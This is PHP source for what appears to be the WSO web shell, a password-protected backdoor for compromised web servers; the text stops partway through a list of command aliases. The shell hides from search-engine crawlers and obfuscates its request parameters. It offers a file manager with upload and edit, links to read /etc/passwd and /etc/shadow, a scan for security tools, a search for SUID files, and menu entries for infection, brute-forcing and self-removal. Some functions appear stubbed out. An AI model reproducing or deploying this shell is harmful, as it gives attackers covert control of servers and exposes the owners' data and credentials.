<?php
$▛ = "21232f297a57a5a743894a0e4a801fc3"; $▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
$▙ = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $▙);
}
if(empty($_POST['charset']))
	$_POST['charset'] = $▜;
if (!isset($_POST['ne'])) {
	if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
}
function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if (PHP_VERSION_ID < 70000)
	@set_magic_quotes_runtime(0);
@define('VERSION', '4.2.5');
if(get_magic_quotes_gpc()) {
	function stripslashes_array($array) {
		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
	}
	$_POST = stripslashes_array($_POST);
    $_COOKIE = stripslashes_array($_COOKIE);
}

if(!empty($▛)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
        prototype(md5($_SERVER['HTTP_HOST']), $▛);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $▛))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
function hardLogin() {
		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		  header('HTTP/1.0 404 Not Found');
		  exit;
		  }
		}
	die("<pre align=center><form method=post>Password<br><input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='submit' style='border:none;background-color:#56AD15;color:#fff;cursor:pointer;'></form></pre>");
}
if(strtolower(substr(PHP_OS,0,3)) == "win")
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';

function hardHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['▜'];
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
<style>
	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
	#particles-js{width: 100%; height: 100px; background-color: #060a10; background-image: url(''); background-repeat: no-repeat; background-size: cover; background-position: 50% 50%;}
	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
	table.info	{color:#C3C3C3;}
	table#toolsTbl {background-color: #060A10;}
	span,h1,a	{color:#fff !important;}
	span		{font-weight:bolder;}
	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
	a			{text-decoration:none;}
	a:hover		{text-decoration:underline;}
	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
	.tooltip:hover::after {opacity:1;visibility:visible;}
	.ml1		{border:1px solid #202832;padding:5px;margin:0;overflow:auto;}
	.bigarea	{min-width:100%;max-width:100%;height:400px;}
	input, textarea, select	{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}
	label {position:relative}
	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
	form		{margin:0px;}
	#toolsTbl	{text-align:center;}
	#fak 		{background:none;}
	#fak td 	{padding:5px 0 0 0;}
	iframe		{border:1px solid #060a10;}
	.toolsInp	{width:300px}
	.main th	{text-align:left;background-color:#060a10;}
	.main tr:hover{background-color:#354252;}
	.main td, th{vertical-align:middle;}
	input[type='submit']{background-color:#2E6E9C;}
	input[type='button']{background-color:#2E6E9C;}
	input[type='submit']:hover{background-color:#56AD15;}
	input[type='button']:hover{background-color:#56AD15;}
	.l1			{background-color:#202832;}
	pre			{font:9pt Courier New;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	
	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		d.mf.a.value = encrypt(d.mf.a.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.c.value = encrypt(d.mf.c.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\d+)([\\S\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				if(!arr||!arr[2])return;
				var body = arr[2].substr(0, parseInt(arr[1],10));
				if(typeof d.cf!='undefined'&&d.cf&&d.cf.output){
					d.cf.output.value+=body;
					d.cf.output.scrollTop=d.cf.output.scrollHeight;
					if(d.cf.cmd)d.cf.cmd.value='';
				}
				var po=document.getElementById('PhpOutput');
				if(po){po.style.display='';po.textContent=body;}
				var so=document.getElementById('strOutput');
				if(so){so.style.display='';so.textContent=body;}
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';
	if(strpos('Linux', $kernel) !== false)
		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$explink .= urlencode($kernel . ' ' . substr($release,0,3));
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $▟)
		$opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
	if(!empty($GLOBALS['▛']))
	$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
	$drives = "";
	if ($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if (is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
}
function hardFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FFDB5F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	<tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='submit'></form></td>
		<td><form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
		<td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
		<td><form method='post' ".( (!function_exists('actionFilesMan'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=ne value=''>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
	</tr></table></div>
	<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
	<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
	</body></html>";
}
if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }
function ex($in) {
	return ($in===''?"↳ Query did not return anything
":"↳ Query did not return anything
");
}
function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}
function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function viewPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#FFDB5F><b>'.perms(@fileperms($f)).'</b></font>';
}
function hardScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}
function which($p) {
	return false;
}
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"VERSION" => VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	}
}
function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function actionSecInfo() {
	hardHeader();
	echo '<h1>Server security information</h1><div class=content>';
	function showSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>' . $n . ': </span>';
			if(strpos($v, "\n") === false)
				echo $v . '<br>';
			else
				echo '<pre class=ml1>' . $v . '</pre>';
		}
	}
	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	showSecParam('Open base dir', @ini_get('open_basedir'));
	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	showSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	if($GLOBALS['os'] == 'nix') {
            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            showSecParam('OS version', @file_get_contents('/proc/version'));
            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $▟)
                    if(which($▟))
                        $temp[] = $▟;
                showSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                showSecParam('HDD space', ex('df -h'));
                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
				showSecParam('Mount options', @file_get_contents('/etc/fstab'));
            }
	} else {
		showSecParam('OS Version',ex('ver'));
		showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts')));
		showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user')));
	}
	echo '</div>';
	hardFooter();
}
function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') { exit; }
	
	if( @$_POST['p2'] == 'mkfile' ) {
	}
	
	hardHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		hardFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$oRb = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				echo 'Can\'t set permissions!<br><script>document.mf.p3.value=\"\";</script>';
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="submit"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value="submit"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#202832><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#202832><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
					echo 'Can\'t rename!<br>';
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value="submit"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
					echo 'Fail!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value="submit"></form>';
			break;
		
		case 'frame':
			$frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
			if ($frameSrc[0] != '/')
				$frameSrc = '/' . $frameSrc;
			if ($frameSrc[strlen($frameSrc) - 1] != '/')
				$frameSrc = $frameSrc . '/';
			$frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
			echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
			break;
	}
	echo '</div>';
	hardFooter();
}
if($os == 'win')
	$aliases = array(
		"List Directory" => "dir",
    	"Find index.php in current dir" => "dir /s /w /b index.php",
    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
    	"Show active connections" => "netstat -an",
    	"Show running services" => "net start",
    	"User accounts" => "net user",
    	"Show computers" => "net view",
		"ARP Table" => "arp -a",
		"IP Configuration" => "ipconfig /all"
	);
else
	$aliases = array(
  		"List dir" => "ls -lha",
		"list file attributes on a Linux second extended file system" => "lsattr -va",
  		"show opened ports" => "netstat -an | grep -i listen",
        "process status" => "ps aux",
		"Find" => "",
  		"find all suid files" => "find / -type f -perm -04000 -ls",
